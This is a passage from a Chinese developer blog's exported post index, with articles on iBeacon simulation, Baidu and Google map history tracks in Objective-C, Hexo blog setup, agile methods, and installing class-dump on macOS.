CBPeripheralManager) &#123; switch peripheral.state &#123; case .unknown: print("蓝牙未知的") case .resetting: print("蓝牙重置中") case .unsupported: print("蓝牙不支持") case .unauthorized: print("蓝牙未验证") case .poweredOff: print("蓝牙未启动") case .poweredOn: print("蓝牙可用") beaconAdvertising() &#125; &#125;&#125; 配置模拟iBeacon广播数据1234567891011func beaconAdvertising() &#123; guard let uuid = UUID(uuidString: beaconUUID) else &#123; return &#125; let region = CLBeaconRegion(proximityUUID: uuid, major: beaconMajorValue, minor: beaconMinorValue, identifier: beaconIdentity) let regionData = region.peripheralData(withMeasuredPower: nil) let regionAdvertising = regionData as? [String : Any] peripheraManager?.startAdvertising(regionAdvertising) print("开始模拟Beacon广播数据\(regionData)")&#125; 监听是否广播成功 若广播成功，则可作为iBeacon使用 需要监听iBeacon可参考iOS蓝牙开发之iBeacon篇(二) 12345func peripheralManagerDidStartAdvertising(_ peripheral: CBPeripheralManager, error: Error?) &#123; print("正在模拟Beacon广播数据: \(peripheral.isAdvertising) --- 错误信息: \(String(error?.localizedDescription ?? "无"))") stateLbl.text = "正在模拟Beacon广播数据: \n\(peripheral.isAdvertising) \n错误信息: \n\(String(error?.localizedDescription ?? "无"))" stateLbl.textAlignment = .center&#125; 参考官方文档维基百科iOS 中 iBeacon 开发]]></content>
      <categories>
        <category>iOS</category>
        <category>蓝牙</category>
      </categories>
      <tags>
        <tag>iOS</tag>
        <tag>蓝牙</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[iOS开发之地图篇(三):历史轨迹记录]]></title>
    <url>%2Farchives%2Fb47045de.html</url>
    <content type="text"><![CDATA[月落乌啼霜满天，江枫渔火对愁眠。姑苏城外寒山寺，夜半钟声到客船。 前言 思 考 要 怎 么 开 始 。。。 嗯 (过了一万年。。。) 最近一直在做一个宠物定位的项目，本来以为只需要参考官方文档接入地图实现功能就可以winner winner chicken dinner了，但是等到我掉以轻心的做到后面再加上历史轨迹疯狂改需求的时候，又双叒叕加上还要百度和谷歌同步实现功能，心中开始有一万只神兽在奔腾，于是、、就有了这篇文章的由来了。 关于历史轨迹 补一张效果图 历史轨迹历经了好几个版本的在几个方案之间来回拉锯，现在终于是。。。还没有定下来具体的方案了🤣 方案一：选时间段查询历史轨迹数据后全部显示在地图上面，然后可以点击播放按钮回放历史轨迹并画线；或者拖动一个UISlideBar滑动条可以切换每一轨迹点并显示轨迹详细信息弹框。 方案二：选时间段查询历史轨迹数据后显示第一个点在地图上面，然后可以通过四个操作按钮（起点，上一个，下一个，终点）切换轨迹点画线并显示轨迹详细信息弹框；或者手动点击切换每一轨迹点并显示轨迹详细信息弹框。 方案三：选时间段查询历史轨迹数据后全部显示在地图上面，然后可以通过四个操作按钮（起点，上一个，下一个，终点）切换轨迹点并显示轨迹详细信息弹框；或者手动点击切换每一轨迹点并显示轨迹详细信息弹框。 方案四五六七八九…待客户和老板定。 问题 方案一：查询轨迹过多导致获取数据比较耗时，显示点比较多画线乱。 方案二：筛选所选时间段的估计点（抽取平均10个点出来，后来又改为5个，在在后来改为服务器配置），画线功能由服务器配置，选择时间段间隔服务器配置。 方案三：在方案二的基础上，分页获取所有数据并全部显示 方案四五六七八九…未知 百度地图历史轨迹开始挖坑 历史古迹无非就是多个位置点构成，所以和上一篇的添加坐标点大头针一样，只是添加多个而已，考虑到控件的重用机制，所以有了下面的代码 1234567891011121314151617181920212223242526// ... 遍历历史古迹数据 创建地图大头针// ... 对每一个坐标反地理编码// ... 在反地理编码里面刷新对应的模型信息地址 并刷新自定义弹框paopaoView- (BMKAnnotationView *)mapView:(BMKMapView *)mapView viewForAnnotation:(id &lt;BMKAnnotation&gt;)annotation&#123; if (![annotation isKindOfClass:[XSPointAnnotation class]]) &#123; // 不是自定义大头针模型 return nil; &#125; BMKAnnotationView *annotationView = nil; XSPointAnnotation *customAnnotation = (XSPointAnnotation *)annotation; if (customAnnotation.annotationType == XSAnnotationTypeLocationPoint) &#123; // 当前位置点类型 annotationView = [mapView dequeueReusableAnnotationViewWithIdentifier:@"LocationAnnotation"]; if (annotationView == nil) &#123; annotationView = [[BMKPinAnnotationView alloc] initWithAnnotation:customAnnotation reuseIdentifier:@"LocationAnnotation"]; &#125; annotationView.image = [UIImage imageNamed:[customAnnotation.locationDetailsModel.deviceBindingTypeImageName stringByAppendingString:@"_small"]]; annotationView.draggable = NO; annotationView.canShowCallout = YES; self.petAnnotationView.locationDetails = customAnnotation.locationDetailsModel; self.petAnnotationView.isHiddenNoNeeds = YES; self.petAnnotationView.width = 270; annotationView.paopaoView = [[BMKActionPaopaoView alloc] initWithCustomView:self.petAnnotationView]; [annotationView setSelected:YES animated:NO]; // 选中当前的 &#125; return annotationView;&#125; 掉坑里了 如果所有的大头针都共用一个自定义的paopaoView（petAnnotationView）的话，就会导致selectAnnotation:animated:方法没有效果 并且只有最后添加的那一个轨迹带你点击才会调用selectAnnotation:animated: 其他大头针点击都会失效 如果要控制切换轨迹点刷新显示弹框信息，那就需要根据索引先移除当前点，再重新添加重新渲染，而且切换不流畅，会出现莫名的问题 怎么从坑里跳出来？ 1、找大牛 2、查资料 3、习惯有坑，顺其自然 但是 作为一个视这世界上只有两件事是真理：人都会死；程序永远有bug为座右铭的程序猿，当然是选择3啊，但是考虑到这样有可能会被打死，而求人又不如求己的理念，我就开始苦逼的查资料，看官方demo和官方论坛（屎一样的论坛，永远回复：在处理中、感谢你的反馈） 经过我的反复查询资料，不断尝试，最后终于在我的灵机一动下解决了，再次印证了爱迪生的话但那1％的灵感是最重要的，甚至比那99％的汗水都要重要。😂 既然一个轨迹点可以正常的点击显示和隐藏，是不是需要每一个轨迹点大头针都需要绑定一个paopaoView呢 本着实践是检验真理的唯一标准，于是有了以下代码 12345678910111213141516171819202122232425- (BMKAnnotationView *)mapView:(BMKMapView *)mapView viewForAnnotation:(id &lt;BMKAnnotation&gt;)annotation&#123; if (![annotation isKindOfClass:[XSPointAnnotation class]]) &#123; // 不是自定义大头针模型 return nil; &#125; BMKAnnotationView *annotationView = nil; XSPointAnnotation *customAnnotation = (XSPointAnnotation *)annotation; if (customAnnotation.annotationType == XSAnnotationTypeLocationPoint) &#123; // 当前位置点类型 annotationView = [mapView dequeueReusableAnnotationViewWithIdentifier:@&quot;XSTracksLocationAnnotation&quot;]; if (annotationView == nil) &#123; annotationView = [[BMKPinAnnotationView alloc] initWithAnnotation:customAnnotation reuseIdentifier:@&quot;XSTracksLocationAnnotation&quot;]; &#125; XSLocationDetails *locationDetails = customAnnotation.locationDetailsModel; XSPetAnnotationView *petAnnotationView = [XSPetAnnotationView petAnnotationView]; annotationView.image = [UIImage imageNamed:[customAnnotation.locationDetailsModel.deviceBindingTypeImageName stringByAppendingString:@&quot;_small&quot;]]; annotationView.draggable = NO; annotationView.canShowCallout = YES; petAnnotationView.isHiddenNoNeeds = YES; petAnnotationView.width = 270; petAnnotationView.locationDetails = locationDetails; annotationView.paopaoView = [[BMKActionPaopaoView alloc] initWithCustomView:petAnnotationView]; self.petAnnotationView = petAnnotationView; &#125; return annotationView;&#125; 是骡子是马拉出来溜溜，编译运行，轨迹点都可以点击了，哇，开心的就像一个几十岁的孩子拍了拍肚皮，正准备去喝杯Coffee舒爽一下呢，发现地址信息没有 于是开始考虑现在是一个轨迹点对应一个自定义的paopaoView，那么在反地理编码的代理回调里面怎么把地址信息对应的轨迹点模型更新呢 根据代理回调里面location坐标和当前的所有历史轨迹数据坐标对比, 开心的打印一下，竟然和传递的转换前的坐标有误差； 仿谷歌地图反地理编码，改代理回调为block回调？直接动手 123456789// XSBaiduGeocoder.htypedef void (^XSReverseGeocodeHandler)(BMKReverseGeoCodeResult *result);@interface XSBaiduGeocoder : NSObject+ (instancetype)geocoder;- (void)reverseGeocodeCoordinate:(CLLocationCoordinate2D)coordinate completionHandler:(XSReverseGeocodeHandler)handler;@end 12345678910111213141516171819202122232425262728293031323334353637383940414243// XSBaiduGeocoder.m@interface XSBaiduGeocoder () &lt;BMKGeoCodeSearchDelegate&gt;@property (nonatomic, copy) XSReverseGeocodeHandler reverseGeocodeHandler;@end@implementation XSBaiduGeocoder+ (instancetype)geocoder&#123; static XSBaiduGeocoder *helper; static dispatch_once_t onceToken; dispatch_once(&amp;onceToken, ^&#123; helper = [[XSBaiduGeocoder alloc] init]; &#125;); return helper;&#125;- (void)reverseGeocodeCoordinate:(CLLocationCoordinate2D)coordinate completionHandler:(XSReverseGeocodeHandler)handler&#123; XSLogFunc self.reverseGeocodeHandler = handler; // 解析地址 BMKReverseGeoCodeOption *reverseGeocodeSearchOption = [[BMKReverseGeoCodeOption alloc] init]; reverseGeocodeSearchOption.reverseGeoPoint = coordinate; BMKGeoCodeSearch *geoCodeSearch = [[XSGeoCodeSearch alloc] init]; geoCodeSearch.delegate = self; if (![geoCodeSearch reverseGeoCode:reverseGeocodeSearchOption]) &#123; XSLog(@"百度反地理编码获取地址失败"); &#125; else &#123; XSLog(@"百度反地理编码获取地址成功"); &#125;&#125;- (void)onGetReverseGeoCodeResult:(BMKGeoCodeSearch *)searcher result:(BMKReverseGeoCodeResult *)result errorCode:(BMKSearchErrorCode)error&#123; XSLogFunc if (self.reverseGeocodeHandler) &#123; self.reverseGeocodeHandler(result); &#125;&#125;@end BMKGeoCodeSearch这个一定要调用一次创建一次，否则只会转换一次地址信息 但是此时虽然轨迹点地址信息都转换了，但是只有点击最后一个轨迹点有地址信息，其他都是空的，这个问题卡了好久脑子没转过来，一直在block捕获方向考虑，后来突然醒悟 self.reverseGeocodeHandler = handlerblock是每次都进来赋值，而地址转换完成的代理回调方法又调用延迟，那在代理回调方法里面回调临时保存的self.reverseGeocodeHandler肯定是最后一个，所以就只会更新最后一个轨迹坐标的模型地址数据 既然BMKGeoCodeSearch是每一个坐标对应一个，那个完全可以自定义XSGeoCodeSearch继承BMKGeoCodeSearch添加对应的回调handler，等地址转换完成的代理回调时候，根据XSGeoCodeSearch保存的handler回调回去，于是代码修改如下 12345678910// XSGeoCodeSearch.h@class BMKReverseGeoCodeResult;typedef void (^XSReverseGeocodeHandler)(BMKReverseGeoCodeResult *result);@interface XSGeoCodeSearch : BMKGeoCodeSearch@property (nonatomic, copy) XSReverseGeocodeHandler reverseGeocodeHandler;@end 1234567// XSBaiduGeocoder.h@interface XSBaiduGeocoder : NSObject+ (instancetype)geocoder;- (void)reverseGeocodeCoordinate:(CLLocationCoordinate2D)coordinate completionHandler:(XSReverseGeocodeHandler)handler;@end 12345678910111213141516171819202122232425262728293031323334353637383940414243// XSBaiduGeocoder.m@interface XSBaiduGeocoder () &lt;BMKGeoCodeSearchDelegate&gt;@end@implementation XSBaiduGeocoder+ (instancetype)geocoder&#123; static XSBaiduGeocoder *helper; static dispatch_once_t onceToken; dispatch_once(&amp;onceToken, ^&#123; helper = [[XSBaiduGeocoder alloc] init]; &#125;); return helper;&#125;- (void)reverseGeocodeCoordinate:(CLLocationCoordinate2D)coordinate completionHandler:(XSReverseGeocodeHandler)handler&#123; XSLogFunc // 解析地址 BMKReverseGeoCodeOption *reverseGeocodeSearchOption = [[BMKReverseGeoCodeOption alloc] init]; reverseGeocodeSearchOption.reverseGeoPoint = coordinate; XSGeoCodeSearch *geoCodeSearch = [[XSGeoCodeSearch alloc] init]; geoCodeSearch.reverseGeocodeHandler = handler; geoCodeSearch.delegate = self; if (![geoCodeSearch reverseGeoCode:reverseGeocodeSearchOption]) &#123; XSLog(@"百度反地理编码获取地址失败"); &#125; else &#123; XSLog(@"百度反地理编码获取地址成功"); &#125;&#125;- (void)onGetReverseGeoCodeResult:(BMKGeoCodeSearch *)searcher result:(BMKReverseGeoCodeResult *)result errorCode:(BMKSearchErrorCode)error&#123; XSLogFunc // 查询searcher 对应的block 然后回调 XSGeoCodeSearch *codeSearcher = (XSGeoCodeSearch *)searcher; if (codeSearcher.reverseGeocodeHandler) &#123; codeSearcher.reverseGeocodeHandler(result); &#125;&#125;@end 再运行，点击切换轨迹点，世界都美好了，操作轨迹点的切换也可以直接使用selectAnnotation:animated:弹出详情自定义弹框了 轨迹点区域控制 如果想控制所有的估计点都在屏幕范围内显示，最早使用的上一篇里面的方法，后来查资料看这一种也可以 1234567891011121314151617181920212223- (void)baiduMapViewFitAnnotationsWithCoordinates:(NSArray *)coordsModels count:(NSUInteger)count&#123; //创建两个数组，用来存所有的经度和纬度 if (count &lt; 2) return; NSMutableArray *latArr = [[NSMutableArray alloc] init]; NSMutableArray *lonArr = [[NSMutableArray alloc] init]; for (XSLocationDetails *locationDetails in coordsModels) &#123; [latArr addObject:@(locationDetails.coordinateBD09ll.latitude)]; [lonArr addObject:@(locationDetails.coordinateBD09ll.longitude)]; &#125; NSNumber *latMax = [latArr valueForKeyPath:@"@max.floatValue"];//最大纬度 NSNumber *latMin = [latArr valueForKeyPath:@"@min.floatValue"];//最小纬度 NSNumber *lonMax = [lonArr valueForKeyPath:@"@max.floatValue"];//最大经度 NSNumber *lonMin = [lonArr valueForKeyPath:@"@min.floatValue"];//最小经度 BMKCoordinateRegion region; region.center.latitude = ([latMax doubleValue] + [latMin doubleValue]) / 2; region.center.longitude = ([lonMax doubleValue] + [lonMin doubleValue]) / 2; region.span.latitudeDelta = 0.0055; // 数字越小 缩放等级越大 region.span.longitudeDelta = 0.0055; region = [self.baiduMapView regionThatFits:region]; [self.baiduMapView setRegion:region animated:YES];&#125; 当然还有更简单的方法,所以一定要多看各种SDK的头文件，看都有哪些功能 12345/** *设置地图使显示区域显示所有annotations,如果数组中只有一个则直接设置地图中心为annotation的位置 *@param annotations 指定的标注 *@param animated 是否启动动画 */- (void)showAnnotations:(NSArray *)annotations animated:(BOOL)animated; 谷歌地图历史轨迹 关于谷歌地图历史轨迹，基本上就没什么说的了，接口相比百度更规范和清晰 谷歌地图添加Marker(相当于百度地图Annotation)直接配置大头针各种属性然后marker.map = self.googleMapView就等于添加了一个大头针，没有回调 谷歌地图触发paopaoView的时候，调用 12345678910111213141516171819- (UIView *)mapView:(GMSMapView *)mapView markerInfoWindow:(GMSMarker *)marker&#123; XSMarker *myMarker = (XSMarker *)marker; XSLocationDetails *locationModel = myMarker.locationDetailsModel; XSPetAnnotationView *petAnnotationView = [XSPetAnnotationView petAnnotationView]; petAnnotationView.isHiddenNoNeeds = YES; [[GMSGeocoder geocoder] reverseGeocodeCoordinate:locationModel.locationCoordinate2D completionHandler:^(GMSReverseGeocodeResponse * _Nullable response, NSError * _Nullable error) &#123; // 获取第一个位置信息 GMSAddress *addressModel = response.firstResult; NSString *firstString = addressModel.lines.firstObject; NSString *lastString = addressModel.lines.lastObject; NSString *address = [NSString stringWithFormat:@"%@, %@", firstString, lastString]; locationModel.deviceAddress = address; petAnnotationView.locationDetails = locationModel; // 地址转换处理重新刷新界面 &#125;]; petAnnotationView.width = 270; petAnnotationView.locationDetails = locationModel; return petAnnotationView;&#125; 谷歌地图貌似没有可以获取地图上所有Marker的方法（可能我没找到），需要添加的时候自己维护一个数组 谷歌地图的反地理编码本来就是block回调 谷歌地图控制所有轨迹点范围的实现 12345678- (void)googleMapViewFitAnnotationsWithCoordinates:(NSArray *)coordsModels count:(NSUInteger)count&#123; GMSCoordinateBounds *bounds = [[GMSCoordinateBounds alloc] init]; for (XSLocationDetails *locationDetails in coordsModels) &#123; bounds = [bounds includingCoordinate:locationDetails.locationCoordinate2D]; &#125; [self.googleMapView animateWithCameraUpdate:[GMSCameraUpdate fitBounds:bounds withPadding:30.0f]];&#125;]]></content>
      <categories>
        <category>iOS</category>
        <category>地图</category>
      </categories>
      <tags>
        <tag>iOS</tag>
        <tag>地图</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Hexo博客搭建]]></title>
    <url>%2Farchives%2Fb8f4bd70.html</url>
    <content type="text"><![CDATA[之前在学习编程和开始工作的时候，也都有整理和写笔记的习惯，笔记一直是使用Gitbook编辑整理和同步的，也有想搭建一个自己的博客但是又因为自己太懒散，而且感觉搭建博客比较复杂，所以就一直没有付诸行动；直到最近偶然看到介绍使用Hexo + GitHubPages搭建博客的文章，就查了下相关的资料和介绍，搭建了一个简单的博客（GitHubPages + Hexo + Next主题）。 关于博客 常见的博客搭建方法（查到资料的） WordPress：一般需要独立域名（收费），传统的博客搭建方法，但是对MarkDown支持不是很好 GitHubPages + Jekell：免费，稍微比较麻烦 GitHubPages + Hexo：免费，使用简单，适合新手入门 关于Hexo Hexo 是一个基于 Nodejs 的静态博客网站生成器，作者是来自中国台湾的Tommy Chen。 作者网站 特点 部署方便且速度快 支持Markdown语法 已移植 Octopress 插件 高扩展性、自订性 兼容Windows, Mac &amp; Linux Hexo实现原理 1、Hexo是一个静态博客生成器，根据给定的主题，负责把写好的 Markdown 文章转换成一堆 HTML + CSS + Javascript 页面。 2、Hexo还有把生成好的站点上传到 Github Pages 的功能。 GitHubPages + Hexo搭建方法 关于使用可参考下面这两篇文章，写的非常详细，而且是针对Windows/Mac两个平台方法，就不在浪费时间码字了。 Mac搭建Hexo博客及NexT主题配置优化 博客搭建包含windows 常用的指令 12345hexo clean // 清空本地缓存，解决由于本地缓存导致部署无效hexo g // == hexo generate #生成静态网页gulp // 压缩生成的静态资料（如果安装gulp插件，具体安装方法见下面）hexo d // == hexo deploy #开始部署hexo s // == hexo server #启动服务器 本地调试使用 插件安装RSS订阅插件 执行如下指令 1npm install hexo-generator-feed --save 打开 Hexo 站点下的 _config.yml ,添加如下配置： 12345678# feed# Dependencies: https://github.com/hexojs/hexo-generator-feedfeed:type: atompath: atom.xmllimit: 20hub:content: 本地搜索插件 执行如下指令 1npm install hexo-generator-searchdb --save 打开 Hexo 站点的 _config.yml,添加配置 12345search:path: search.xmlfield: postformat: htmllimit: 10000 静态资源压缩插件 安装gulp 1npm install gulp -g // 如果报npm WARN deprecated警告 可使用npm install -g npm 安装gulp插件： 12345npm install gulp-minify-css --save // 如果报npm WARN deprecated警告则使用sudo npm install gulp-clean-css执行npm install gulp-uglify --savenpm install gulp-htmlmin --savenpm install gulp-htmlclean --savenpm install gulp-imagemin --save 主题配置设置网站标签页favicon图标 图标格式：32 * 32 的ico格式图标，重命名为favicon.ico 把设计好的图标放在/themes/next/source/images里 修改主题配置文件medium 1234567favicon: small: /images/favicon-16x16-next.png medium: /images/favicon.ico apple_touch_icon: /images/apple-touch-icon-next.png safari_pinned_tab: /images/logo.svg #android_manifest: /images/manifest.json #ms_browserconfig: /images/browserconfig.xml 更多配置可参考Hexo+Next个人博客主题优化 关于多电脑同步 使用电脑搭建好博客后可能面临如下问题 1、是在家里私人电脑上搭建的，想在公司也可以愉快的写文章 2、换了一台新的电脑（挣钱了要换装备😂） 3、电脑系统崩了😭 关于多电脑同步解决方案1 gitHub分支管理，master分支存博客静态网页资源，Hexo分支存所有源文件（设置为默认分支） 每个电脑每次更新文章前需要正常的git同步操作 每个电脑每次更新文章后需要正常的git同步操作 但是个人感觉不安全，别人可能直接把你的Hexo分支拉取下来就等于获取了你的全部博客资源（虽然我的博客没什么有用的价值😂） 具体分支实现可参考利用分支同步 关于多电脑同步解决方案2 每次手动拷贝最新的文件夹替换另一台电脑旧文件夹（想想就麻烦） 通过云盘如Dropbox自动同步整个文件夹，使所有的电脑都可以同步到最新的 目标电脑获取到最新的博客文件后 如果是情形3可以考虑先把整个博客目录拷贝出来到新的系统博客目录下 GitHub添加配置新电脑的SSH key 和搭建时一样参考Mac搭建Hexo博客及NexT主题配置优化 配置运行环境，执行如下指令 12brew install node // 安装Node.jsnpm install -g hexo // 安装hexo 切换到博客目录下安装博客模块和插件 (具体参考之前安装过的插件) 12345678910111213npm install npm install hexo-deployer-git --save npm install hexo-generator-feed --save npm install hexo-generator-sitemap --save npm install hexo-generator-feed --save npm install hexo-generator-searchdb --save npm install -g gulp npm install gulp-minify-css --save npm install gulp-uglify --save npm install gulp-htmlmin --save npm install gulp-htmlclean --save npm install gulp-imagemin --save 又可以愉快的随时随地写文章了😂 参考 Mac搭建Hexo博客及NexT主题配置优化 免费个人博客搭建详解 Hexo+Next个人博客主题优化 利用Hexo在多台电脑上提交和更新github pages博客]]></content>
      <categories>
        <category>整理</category>
      </categories>
      <tags>
        <tag>Blog</tag>
        <tag>Hexo</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[敏捷开发]]></title>
    <url>%2Farchives%2Fed2e9abb.html</url>
    <content type="text"><![CDATA[春日游，杏花吹满头。陌上谁家年少足风流？ 传统的软件开发模式需要经历问题评估、计划解决方案、设计系统架构、开发代码、测试、部署和使用系统、维护解决方案等过程。 如瀑布流模式: 它是以文档为驱动，在整个开发过程中，开发人员根据需求文档进行开发，一切以文档为依据。 缺点 由于开发模型是线性的，用户只有等到整个过程的末期才能见到开发成果，从而增加了开发的风险； 早期的错误可能要等到开发后期的测试阶段才能发现，进而带来严重的后果。 各个软件生命周期衔接花费时间较长，团队人员交流成本大。 在需求不明并且在项目进行过程中可能变化的情况下基本是不可行的。 软件开发的11种模式 敏捷开发(Agile Development) 什么是敏捷开发 1、敏捷开发(Agile Development)是一种以人为核心、迭代、循序渐进的开发方式。2、在敏捷开发中，软件项目的构建被切分成多个子项目，各个子项目的成果都经过测试，具备集成和可运行的特征。3、它并不是一门技术，而是一种开发方式，是一种软件开发的流程。4、作用指导我们用规定的环节去一步一步完成项目的开发。因为它采用的是迭代式开发，所以这种开发方式的主要驱动核心是人。 敏捷开发适用于 客户不知道自己要啥的情况，这样的客户占绝大多数。因为客户不知道要啥，所以你需要不断帮客户弄明白他到底想要啥。换句话说，你需要和客户沟通，合作，倾听反馈，持续改进； 竞争激烈的市场，这样的情况下，赶在竞争对手前交付一个不完美但至少能用的产品非常重要； 快速变化的市场，你在埋头造一辆汽车的时候，客户已经想开飞机满天飞了，这就需要你能一步步的把汽车改成飞机，还能按时交付； 适用于在一个地方办公的小团队，一般 10 个人以内。这样能使敏捷中主要的沟通方式「Face to Face」是可行的。 敏捷开发流程 敏捷开发实现方式 Scrum XP Scrum 项目角色 产品负责人（Product Owner）：主要负责确定产品的功能和达到要求的标准，指定软件的发布日期和交付的内容，同时有权力接受或拒绝开发团队的工作成果。 流程管理员（Scrum Master）：主要负责整个Scrum流程在项目中的顺利实施和进行，以及清除挡在客户和开发工作之间的沟通障碍，使得客户可以直接驱动开发。 开发团队（Scrum Team）：主要负责软件产品在Scrum规定流程下进行开发工作，人数控制在5~10人左右，每个成员可能负责不同的技术方面，但要求每成员必须要有很强的自我管理能力，同时具有一定的表达能力；成员可以采用任何工作方式，只要能达到Sprint的目标。 XP（Extreme Programming）什么是XP 极限编程（eXtreme Programming），是一种全新的、轻量级的、灵巧的软件开发方法，是一种软件工程方法学。它强调程序设计团队与业务专家之间的紧密协作、面对面的沟通（比书面的文档更有效）、频繁交付新的软件版本、紧凑而自我组织型的团队、能够很好的适应需求变化的代码编写和团队组织方法，更注重软件开发中人的作用。 XP的核心是沟通（Communication）、简单（Simplicity）、反馈（Feedback）、勇气（Courage）四大价值观，它们是XP的基础，也是XP的灵魂。敏捷开发之XP 敏捷开发中XP与SCRUM的区别 1、迭代长度的不同 XP的一个Sprint的迭代长度大致为1~2周, 而Scrum的迭代长度一般为 2~ 4周. 2、在迭代中, 是否允许修改需求 XP在一个迭代中，如果一个User Story(一个用户需求)还没有实现， 则可以考虑用另外的需求将其替换，替换的原则是需求实现的时间量是相等的。 而Scrum是不允许这样做的，一旦迭代开工会完毕, 任何需求都不允许添加进来，并有Scrum Master严格把关，不允许开发团队受到干扰 在迭代中，User Story是否严格按照优先级别来实现 XP是务必要遵守优先级别的。 但Scrum在这点做得很灵活， 可以不按照优先级别来做 Scrum这样处理的理由是：如果优先问题的解决者，由于其它事情耽搁，不能认领任务，那么整个进度就耽误了。 另外一个原因是，如果按优先级排序的User Story #6和#10，虽然#6优先级高，但是如果#6的实现要依赖于#10，则不得不优先做#10. 3、软件的实施过程中，是否采用严格的工程方法，保证进度或者质量 Scrum没有对软件的整个实施过程开出个工程实践的处方，要求开发者自觉保证。 但XP对整个流程方法定义非常严格，规定需要采用TDD, 自动测试， 结对编程，简单设计，重构等约束团队的行为。]]></content>
      <categories>
        <category>整理</category>
      </categories>
      <tags>
        <tag>敏捷开发</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[汇编初识（Mac)]]></title>
    <url>%2Farchives%2F24e561e5.html</url>
    <content type="text"><![CDATA[Decompile class-dump安装方法当Mac升级了OSX 10.11后，配置class-dump的时候，会发现推荐的class-dump无法放入目录/usr/bin 原因是 OSX10.11的一个新特性 Rootless,也叫System Integrity Protection（SIP）和SELinux差不多，都是限制root用户的权限 其实可以在RecoveryMode关闭这个特性，这样就直接可以读写/usr/bin了，不过不建议。 关闭方法：开机的时候按住option出现选择磁盘的界面按command + R进入RecoveryMode，选择实用工具终端，输入csrutil disable回车搞定 class-dump下载地址 http://stevenygard.com/projects/class-dump/ 安装方法1 查看磁盘根目录是否存在~/bin路径，存在就下一步，不存在，打开Terminal，输入mkdir ~/bin，在当前用户根目录下创建一个bin目录。 把下载下来的dmg打开，复制文件文件里面的class-dump到创建的bin目录下。赋权限:chmod +x ~/bin/class-dump 打开bash_profile文件配置环境变量 vim ~/.bash_profile 按下 i 键进入编辑状态，在最下方加一行export PATH=$HOME/bin/:$PATH 按下esc键, 再按shift+: 输入 wq! 进行保存退出编辑 在Terminal中执行source ~/.bash_profile 执行class-dump测试是否成功，成功如下： 12345678910111213141516171819202122MelodydeMBP:~ melody$ class-dumpclass-dump 3.5 (64 bit)Usage: class-dump [options] &lt;mach-o-file&gt;where options are:-a show instance variable offsets-A show implementation addresses--arch &lt;arch&gt; choose a specific architecture from a universal binary (ppc, ppc64, i386, x86_64, armv6, armv7, armv7s, arm64)-C &lt;regex&gt; only display classes matching regular expression-f &lt;str&gt; find string in method name-H generate header files in current directory, or directory specified with -o-I sort classes, categories, and protocols by inheritance (overrides -s)-o &lt;dir&gt; output directory used for -H-r recursively expand frameworks and fixed VM shared libraries-s sort classes and categories by name-S sort methods by name-t suppress header in output, for testing--list-arches list the arches in the file, then exit--sdk-ios specify iOS SDK version (will look in /Developer/Platforms/iPhoneOS.platform/Developer/SDKs/iPhoneOS&lt;version&gt;.sdk--sdk-mac specify Mac OS X version (will look in /Developer/SDKs/MacOSX&lt;version&gt;.sdk--sdk-root specify the full SDK root path (or use --sdk-ios/--sdk-mac for a shortcut)MelodydeMBP:~ melody$ 推荐安装方法2 下载后解压后会有class-dump和源码文件。 将class-dump复制到/usr/bin/class-dump。 如果是OS X 10.11，因为没有/usr/bin文件夹的写权限，所以将class-dump复制到/usr/local/bin/class-dump即可。 打开Terminal，执行命令赋予其执行权限： 1sudo chmod 777 /usr/bin/class-dump 执行class-dump测试是否成功. class-dump使用命令如下：1class-dump -H /Users/sevencho/Desktop/KYRemoteUnit.app -o /Users/sevencho/Desktop/headers -H 代表着要解析的文件 /Users/sevencho/Desktop/KYRemoteUnit.app 需要反编译的应用路径（解压.ipa包获得） -o 表示解析完成保存的目录 /Users/sevencho/Desktop/headers 反编译出的头文件存放路径 利用 class-dump 可以导出 AppKit，UIKitAppKit :1class-dump /System/Library/Frameworks/AppKit.framework UIKit :1class-dump /Developer/Platforms/iPhoneOS.platform/Developer/SDKs/iPhoneOS.sdk/System/Library/Frameworks/UIKit.framework]]></content>
      <categories>
        <category>汇编</category>
      </categories>
      <tags>
        <tag>汇编</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[iOS开发之地图篇(二)]]></title>
    <url>%2Farchives%2Fb3b6a999.html</url>
    <content type="text"><![CDATA[绿蚁新醅酒，红泥小火炉。晚来天欲雪，能饮一杯无？ 百度地图1、注册地图api key1234567// 在程序启动代理方法注册baidu map api key 百度开发者平台获取_mapManager = [[BMKMapManager alloc]init];// 如果要关注网络及授权验证事件，请设定 generalDelegate参数BOOL ret = [_mapManager start:XSBaiduMapApiKey generalDelegate:nil];if (!ret) &#123; XSLog(@&quot;BMKMapManager start failed!&quot;);&#125; 2、初始化地图 添加地图的初始化配置 123456789101112131415161718192021222324252627282930313233343536373839404142434445- (void)setupBaiduMapView&#123; BMKMapView *mapView = [[BMKMapView alloc] initWithFrame:self.view.bounds]; mapView.mapType = BMKMapTypeStandard; // 设定为标准地图 mapView.showsUserLocation = YES; mapView.userTrackingMode = BMKUserTrackingModeNone; // 设置用户位置图标类型 mapView.showMapScaleBar = YES; BMKLocationViewDisplayParam *displayParam = [[BMKLocationViewDisplayParam alloc] init]; displayParam.locationViewImgName = @&quot;icon_center_point&quot;; displayParam.isAccuracyCircleShow = NO; [mapView updateLocationViewWithParam:displayParam];// 配置用户位置信息如精度圈、图标 mapView.zoomLevel = kMapsZoomLevel; mapView.minZoomLevel = kMapsMinZoomLevel; mapView.maxZoomLevel = kMapsMaxZoomLevel; [self.view insertSubview:mapView atIndex:0]; self.baiduMapView = mapView; // 定位服务 BMKLocationService *locService = [[BMKLocationService alloc] init]; locService.desiredAccuracy = kCLLocationAccuracyNearestTenMeters; [locService startUserLocationService]; self.locService = locService; // 反地理编码 BMKGeoCodeSearch *geoCodeSearch = [[BMKGeoCodeSearch alloc] init]; self.geoCodeSearch = geoCodeSearch; // 针对切换地图类型后设置代理 （如果有做地图切换功能） self.baiduMapView.delegate = self; // 此处记得不用的时候需要置nil，否则影响内存的释放 self.locService.delegate = self; self.geoCodeSearch.delegate = self;&#125;-(void)viewWillAppear:(BOOL)animated&#123; [self.baiduMapView viewWillAppear]; self.baiduMapView.delegate = self; // 此处记得不用的时候需要置nil，否则影响内存的释放 self.locService.delegate = self; self.geoCodeSearch.delegate = self;&#125;-(void)viewWillDisappear:(BOOL)animated&#123; [self.baiduMapView viewWillDisappear]; self.baiduMapView.delegate = nil; // 不用时，置nil self.locService.delegate = nil; self.geoCodeSearch.delegate = 